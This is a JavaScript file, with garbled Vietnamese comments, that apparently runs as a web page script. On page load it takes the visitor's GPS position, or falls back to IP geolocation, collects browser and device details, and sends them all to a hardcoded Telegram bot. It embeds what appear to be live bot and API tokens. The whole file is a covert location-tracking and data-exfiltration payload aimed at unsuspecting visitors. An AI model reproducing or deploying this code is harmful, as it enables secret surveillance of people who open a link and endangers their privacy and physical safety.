const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ‚ö†Ô∏è N√äN ƒê·ªîI TOKEN M·ªöI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nh·∫≠n tin nh·∫Øn
const IPINFO_TOKEN = "ffafdfeb7f37bf"; // Thay b·∫±ng token t·ª´ ipinfo.io

// H√†m l·∫•y th√¥ng tin thi·∫øt b·ªã
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Kh√¥ng x√°c ƒë·ªãnh";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
    if (userAgent.includes("Edg")) browser = "Microsoft Edge";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) browser = "Opera";

    return {
        userAgent: userAgent,
        browser: browser,
        platform: navigator.platform
    };
}

// H√†m g·ª≠i th√¥ng tin l√™n Telegram
function sendToTelegram(lat, lon, accuracy, source, city, region, country) {
    const deviceInfo = getDeviceInfo();
    const locationUrl = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Kh√¥ng x√°c ƒë·ªãnh";

    const message = `
üîç **TH√îNG TIN TRUY C·∫¨P**
üåç V·ªã tr√≠: [Xem tr√™n b·∫£n ƒë·ªì](${locationUrl})
üéØ ƒê·ªô ch√≠nh x√°c: ${accuracy}
üì° Ngu·ªìn d·ªØ li·ªáu: ${source}
üèôÔ∏è Th√†nh ph·ªë: ${city || "Kh√¥ng x√°c ƒë·ªãnh"}
üèõÔ∏è T·ªânh/Bang: ${region || "Kh√¥ng x√°c ƒë·ªãnh"}
üåè Qu·ªëc gia: ${country || "Kh√¥ng x√°c ƒë·ªãnh"}
üíª H·ªá ƒëi·ªÅu h√†nh: ${deviceInfo.platform}
üåê Tr√¨nh duy·ªát: ${deviceInfo.browser}
üñ•Ô∏è User-Agent: ${deviceInfo.userAgent}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });
}

// H√†m l·∫•y v·ªã tr√≠ qua GPS
function getLocationByGPS() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const { latitude, longitude, accuracy } = position.coords;
            sendToTelegram(latitude, longitude, `${accuracy} m√©t`, "GPS", "Kh√¥ng x√°c ƒë·ªãnh", "Kh√¥ng x√°c ƒë·ªãnh", "Kh√¥ng x√°c ƒë·ªãnh");
        }, (error) => {
            console.log("Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠ b·∫±ng GPS:", error);
            getLocationByIP(); // N·∫øu th·∫•t b·∫°i, d√πng IP ƒë·ªÉ l·∫•y v·ªã tr√≠
        });
    } else {
        console.log("Tr√¨nh duy·ªát kh√¥ng h·ªó tr·ª£ GPS.");
        getLocationByIP(); // N·∫øu kh√¥ng c√≥ GPS, d√πng IP
    }
}

// H√†m l·∫•y v·ªã tr√≠ qua IP
function getLocationByIP() {
    fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`)
        .then(response => response.json())
        .then(data => {
            const [lat, lon] = (data.loc || ",").split(",");
            sendToTelegram(lat, lon, "D·ªØ li·ªáu t·ª´ IP (k√©m ch√≠nh x√°c)", "IP", data.city, data.region, data.country);
        })
        .catch(error => {
            console.log("Kh√¥ng th·ªÉ l·∫•y v·ªã tr√≠ t·ª´ IP:", error);
        });
}

// G·ªçi h√†m l·∫•y v·ªã tr√≠ khi t·∫£i trang
getLocationByGPS();
